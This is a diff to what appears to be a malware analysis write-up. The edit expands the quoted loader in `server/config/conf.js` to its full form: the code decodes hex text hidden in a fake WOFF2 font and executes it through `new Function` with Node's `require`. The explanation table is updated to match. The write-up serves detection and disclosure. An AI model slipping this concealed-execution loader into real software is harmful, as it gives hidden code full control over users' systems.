@@ -25,23 +25,32 @@ skip font files, and the loader contains no URL to grep for.
 
 ## Technical analysis
 
-The loader, `server/config/conf.js` (lines 4, 7 and 9 shown):
+The loader, `server/config/conf.js`, from line 4 to the end (lines 1–3 not
+shown):
 
 ```javascript
 const hex = fs.readFileSync(path.join(__dirname, '../../webfonts/fa-brands-regular.woff2'), 'utf8')
-// lines 5-6 (not shown) strip every non-hex character; line 8 not shown
+  .replace(/[^0-9a-f]/gi, '');
+
 const src = Buffer.from(hex, 'hex').toString('utf8');
+
 new Function('require','module','exports','__filename','__dirname', src)(
+  require,
+  module,
+  exports,
+  __filename,
+  __dirname
+);
 ```
 
-The quote comes from GitLab's file view, read remotely.
+I checked this quote against GitLab's file view on 2026-10-15.
 
 | Step | What happens |
 |------|--------------|
 | `readFileSync(… 'fa-brands-regular.woff2', 'utf8')` | Reads the "font" as text. The path resolves to `webfonts/` at the repo root |
-| non-hex characters stripped | Needed because Node's hex decoder stops at the first non-hex character |
+| `.replace(/[^0-9a-f]/gi, '')` | Strips every non-hex character. Needed because Node's hex decoder stops at the first non-hex character |
 | `Buffer.from(hex, 'hex')` | Turns the hex back into a source string |
-| `new Function('require', 'module', …, src)(…)` | Compiles that string with parameters named `require`, `module`, `exports`, `__filename` and `__dirname`, then calls it. The arguments are on the next line, not shown; presumably they're the module's own. Either way, code built with `new Function` can reach `process` and run anything Node can |
+| `new Function('require', 'module', …, src)(…)` | Compiles that string with parameters named `require`, `module`, `exports`, `__filename` and `__dirname`, then calls it with the loader module's own `require`, `module`, `exports`, `__filename` and `__dirname`. The payload can load any Node module, including `fs`, `child_process` and the network modules, so it can run anything Node can |
 
 **The "font":** a real WOFF2 file is binary and starts with the 4-byte
 signature `wOF2`. This one is 94,839 bytes of text that the loader treats as
